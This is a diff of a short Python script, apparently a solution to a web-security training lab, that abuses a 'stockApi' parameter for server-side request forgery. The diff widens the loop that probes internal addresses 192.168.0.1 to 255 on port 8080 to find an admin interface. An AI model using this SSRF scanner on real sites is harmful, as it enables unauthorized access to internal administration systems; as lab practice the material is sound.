@@ -5,13 +5,13 @@ import sys
 
 if len(sys.argv) != 2:
     print("Usage: python sol.py $URL$")
+    exit()
 
 url = sys.argv[1]+"/product/stock"
 
-for i in range(234,236):    
+for i in range(1,256):    
     stock = f"/http://192.168.0.{i}:8080/admin"
     resp = requests.post(url,data={"stockApi":stock})
-
     print(stock,end= "  ")
     
     if resp.status_code == 200 :
